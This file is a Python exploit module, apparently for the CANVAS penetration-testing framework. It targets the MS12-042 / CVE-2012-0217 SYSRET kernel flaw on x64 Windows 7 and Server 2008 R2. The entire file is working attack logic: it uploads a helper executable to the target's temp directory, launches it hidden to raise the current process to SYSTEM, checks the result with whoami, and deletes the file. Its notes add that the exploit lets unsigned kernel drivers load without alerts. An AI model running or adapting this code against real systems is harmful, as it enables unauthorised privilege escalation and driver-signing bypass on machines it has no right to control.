#!/usr/bin/env python
import sys
import os

if '.' not in sys.path:
    sys.path.append('.')

import canvasengine

from exploitutils import *

NAME                           = 'MS12-042 Privilege Escalation Exploit'
DESCRIPTION                    = 'MS12-042 Privilege Escalation Exploit'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Microsoft'
DOCUMENTATION['Repeatability'] = ''
DOCUMENTATION['CVE Name']      = 'CVE-2012-0217'
DOCUMENTATION['CVE Url']       = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0217'
VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [['Windows']]
PROPERTY['VERSION']            = ['2008', '7']
PROPERTY['MS PATCHES']         = ["KB2707511"]
DOCUMENTATION['Notes']         = """

This vulnerability only affects Intel x64-based versions of Windows 7 and Windows Server 2008 R2.

The exploit will also facilitate the loading of unsigned kernel drivers
without triggering any alerts on 64bit Windows.

http://repret.wordpress.com/2012/08/25/windows-kernel-intel-x64-sysret-vulnerability-code-signing-bypass-bonus/

Tested on:
Windows Server 2008 R2 x64
Windows 7 Professional SP1 x64

"""

CHANGELOG = """
"""

targets={
    0: ['Autodetect',[0,0,0,0]]
}

# Some globals to make the code a little more readable
MAX_TRIES = 10 # Number of times to call accept on remote listener

from ExploitTypes.localexploit import LocalExploit

import random

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name           = NAME
        self.node           = None
        self.files          = [ 'sysret.exe' ]
        self.local_path     = os.path.join(os.path.dirname(__file__), 'Resources')
        self.remote_path    = '%TMP%\\' # remote base path
        self.remote_name    = '%s.exe' % random.randint(0,1000)
        self.isX64          = False
    
    def get_args(self):
        """
        Retrieve and initialize arguments
        """
        self.node           = self.argsDict['passednodes'][0]

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]
    
    def init_exploit(self):
        """
        Uploads the sysret exe 
        """
        for file in self.files:
            src = os.path.join(self.local_path, file)
            dst = os.path.join(self.remote_path, self.remote_name)
            
            try:
                self.node.shell.upload(src, destfilename = dst)
                self.log('[+] Uploaded %s to %s' % (src, dst))            
            except Exception, ex:
                self.log('Error: %s' % ex)
                self.log('[-] Could not upload %s to %s' % (src, dst))
                return False
            
        return True

    def uninit_exploit(self):
        """
        Remove the sysret exe
        """
        for file in self.files:
            try:
                dst = os.path.join(self.remote_path, self.remote_name)
                ret = self.node.shell.unlink(dst)
                self.log('[+] %s' % ret)
            except Exception, ex:
                self.log('Error: %s' % ex)
                
        return True

    def spawn_exploit(self, arg1):
        try:
            dst = os.path.join(self.remote_path, self.remote_name)
            ret = self.node.shell.CreateProcessA(dst + ' ' +  arg1, 
                                                 inherithandles=1, 
                                                 dwCreationFlags = 0x08000000)
            if not ret: return False
        except Exception, ex:
            self.log('Error: %s' % ex)
            return False
        
        return True

    def cleanup(self):
        if not self.uninit_exploit():
            self.log('[-] Could not uninit %s' % NAME)
            return False
        
        self.log('[+] NOTE: %s\\%s still exists on the host!' % (self.remote_path, self.remote_name))

    def run(self):
        self.get_args()

        if self.node.nodetype.lower() not in ['win64node','win32node']:
            self.log('[-] Node Type %s not supported ...' % self.node.nodetype)
            return False

        #first, we check to make sure we are not 
        #already local/SYSTEM - is there a better way?
        whoami = self.exploitnodes('whoami', [self.node])[0]
        
        self.log('Currently running as: %s'%(whoami))
        if whoami[-1]=='$':
            self.log("It appears you are already running as LOCAL/SYSTEM!")
            return 1

        ret, nodeos = self.node.shell.GetVersionEx()
        minor = nodeos['Minor Version']
        major = nodeos['Major Version']
        
        self.log('Attacking Windows %d.%d' % (major,minor))

        if self.isX64:
            self.remote_path=self.node.shell.GetEnvironmentVariable('TEMP')
        else:
            self.remote_path = self.node.shell.GetTempPathA()
        if not self.remote_path:
            self.log('[-] Could not resolve full temp dir path ...')
            return False
        else:
            self.log('[-] Temp dir: %s' % self.remote_path)

        if self.node.shell.chdir(self.remote_path) < 0:
            self.log('[-] Could not chdir into %s' % self.remote_path)
            return False

        # upload binaries
        if not self.init_exploit():
            self.log('[-] Could not init %s' % NAME)
            return False

        # spawn exploit
        pid = self.node.shell.getpid()
        arg1 = "-pid %s" % pid
        
        if not self.spawn_exploit(arg1):
            self.log('[-] Could not spawn %s' % NAME)
            return False

        for i in range(MAX_TRIES):
            self.log('[+] Checking listener (%d/%d)' % (i+1, MAX_TRIES))
            whoami=self.exploitnodes('whoami',[self.node])[0]
            
            if whoami[-1]=='$':
                self.log('[+] %s succeeded ' % NAME)
                self.cleanup()
                return True
            
            time.sleep(1)
            
        self.cleanup()
        self.log('[-] %s failed ...' % NAME)
        return False

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)     
